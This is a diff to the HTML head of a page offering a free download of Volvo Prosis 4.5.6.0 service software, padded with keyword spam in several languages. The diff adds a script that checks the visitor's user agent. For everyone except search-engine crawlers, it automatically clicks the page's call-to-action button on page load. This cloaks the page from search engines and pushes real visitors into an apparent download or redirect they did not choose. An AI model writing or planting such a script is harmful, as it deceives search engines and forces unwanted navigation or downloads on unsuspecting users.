@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Volvo Prosis 4.5.6.0 03.2024 Offline Service Information</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Volvo Prosis 4.5.6.0 (03.2024) for offline service info, spare parts, wiring diagrams, and maintenance for Volvo equipment.">
     <meta name="keywords" content="Volvo Prosis 4.5.6.0, Volvo Prosis 03.2024, Offline Volvo Service Information, Volvo Spare Parts Catalog, Volvo Wiring Diagram, Volvo Service Bulletin, Volvo Equipment Specification, Volvo Maintenance Guides, Volvo Repair Guides, Volvo Service Information Software, Volvo Technical Information, Volvo Equipment Maintenance, Prosis 4.5.6.0 Offline, Volvo Prosis Spare Parts, Volvo Service &amp; Maintenance, Volvo Prosis 4.5.6.0 free download, Volvo Prosis 03.2024 free download, Volvo Prosis offline service information download, Volvo Prosis spare parts catalog download, Volvo Prosis wiring diagram download, Volvo Prosis service bulletin download, Volvo Prosis specification download, Volvo Prosis service &amp; maintenance, Volvo Prosis technical information download, Volvo Prosis maintenance and repair guides, Volvo Prosis diagnostic software, Volvo Prosis diagnostic software download, Volvo Prosis diagnostic software free download, Download Volvo Prosis 4.5.6.0, Volvo Prosis 4.5.6.0 high speed download, Вольво Просис 4.5.6.0, Вольво Просис 03.2024, Вольво Справочное обслуживание без подключения к интернету, Вольво Каталог запчастей, Вольво Электросхемы, Вольво Бюллетень по обслуживанию, Вольво Спецификация оборудования, Вольво Руководства по обслуживанию, Вольво Руководства по ремонту, Программное обеспечение для обслуживания Вольво, Вольво Техническая информация, Вольво Обслуживание оборудования, Просис 4.5.6.0 Оффлайн, Запчасти для Вольво Просис, Вольво Сервис и техническое обслуживание, Вольво Просис 4.5.6.0 скачать бесплатно, Вольво Просис 03.2024 скачать бесплатно, Вольво Просис со справочной информацией скачать, Каталог запчастей для Вольво Просис скачать, Электросхемы для Вольво Просис скачать, Бюллетень по обслуживанию для Вольво Просис скачать, Спецификация для Вольво Просис скачать, Техническая информация для Вольво Просис скачать, Программное обеспечение для диагностики Вольво Просис, Программное обеспечение для диагностики Вольво Просис скачать, Программное обеспечение для диагностики Вольво Просис скачать бесплатно, Завантажити Вольво Просис 4.5.6.0, Вольво Просис завантажити висока швидкість, Volvo Prosis 4.5.6.0 скачать бесплатно, Volvo Prosis 03.2024 скачать бесплатно, Volvo Prosis offline service information download, Volvo Prosis навантажувачі, Volvo Prosis 4.5.6.0 завантажити">
     <style>
